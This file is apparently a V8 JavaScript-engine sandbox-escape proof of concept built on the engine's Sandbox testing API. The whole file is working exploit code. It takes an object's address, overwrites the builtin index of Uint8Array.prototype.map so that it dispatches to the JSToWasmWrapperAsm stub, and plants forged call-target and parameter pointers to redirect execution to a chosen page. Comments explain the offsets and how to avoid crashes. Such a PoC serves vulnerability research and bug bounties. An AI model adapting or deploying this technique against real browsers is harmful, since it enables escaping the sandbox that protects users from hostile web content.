let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj);
}

function writeWord(obj, byteOffset, value) {
  let ptr = addrof(obj);
  return memory.setUint32(ptr + byteOffset, value, true);
}

function writeQword(obj, byteOffset, value) {
  let ptr = addrof(obj);
  return memory.setBigUint64(ptr + byteOffset, value, true);
}

function readWord(obj, byteOffset) {
  let ptr = addrof(obj);
  return memory.getUint32(ptr + byteOffset, true);
}

let f = Uint8Array.prototype.map;
let idx = readWord(f, 0xc) >> 9;
writeWord(f, 0xc, (idx + 1) << 9);                 // JSToWasmWrapperAsm is immediately after TypedArrayPrototypeMap in builtins-definitions.h
writeQword(f, 0x10 + 1, 0n);                       // Used to subtract from RSP
writeQword(f, 0x18+1, BigInt(Sandbox.targetPage)); // callTarget
writeQword(f, 0x20+1, BigInt(Sandbox.targetPage)); // paramStart
writeQword(f, 0x28+1, BigInt(Sandbox.targetPage)); // paramEnd  - must be equal to paramStart and a valid pointer to avoid a crash
f.apply({}, [0, 0]);                               // apply bypasses some extra checks which would crash during receiver setup
